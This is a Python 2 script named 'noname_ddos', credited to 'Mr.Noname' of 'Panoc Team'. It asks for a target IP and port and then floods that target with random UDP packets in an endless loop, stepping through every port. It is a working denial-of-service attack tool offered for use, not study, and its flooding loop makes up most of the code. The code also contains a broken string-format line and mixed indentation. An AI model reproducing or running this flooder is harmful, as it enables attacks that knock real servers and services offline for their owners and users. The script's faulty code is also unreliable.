import sys
import os
import time
import socket
import random


K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'
N = '\x1b[0m'    # WARNA MATI


# Kode Waktu
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
year = now.year

###################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###################

os.system("clear")
os.system("figlet noname_ddos")
print
print "-----------------------------------------"
print (R+"Author              : Mr.Noname      |")
print "----------------------------------------|----------"
print "   Team                : Panoc Team     |       |   \ "
print "   Youtube             : PANOC TEAM     |       \___ \   "
print "   Instagam            : panoc.team     |            | "
print "   Private Instagam    : mr_noname25    |            |  "
print "---------------------------------------------/\-------"
print (K+"Version : %s1.0%s" (K,H))
print
ip = raw_input("Target Ip : ")
port = input(R+"Enter Port: ")

os.system("clear")
os.system("figlet loading...")
print " <-----> 10%"
time.sleep(2)
print " <---------->  20%"
time.sleep(2)
print " <---------------> 30%"
time.sleep(2)
print " <--------------------> 40%"
time.sleep(2)
print " <-------------------------> 50%"
time.sleep(2)
print " <------------------------------> 60%"
time.sleep(2)
print " <-----------------------------------> 70%"
time.sleep(2)
print " <----------------------------------------> 80%"
time.sleep(2)
print " <---------------------------------------------> 90%"
time.sleep(2)
print " <--------------------------------------------------> 100%"
time.sleep(5)
os.system("clear")
print (R+" Connect To Server %s ..."% (ip))
time.sleep(16)
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
	sent = sent + 1
	port = port + 1 
	print (R+"Mr.Noname :~ Mengirim %s Packet Ke %s Dengan Port %s"% (sent,ip,port))
	if port == 65534:
       port = 1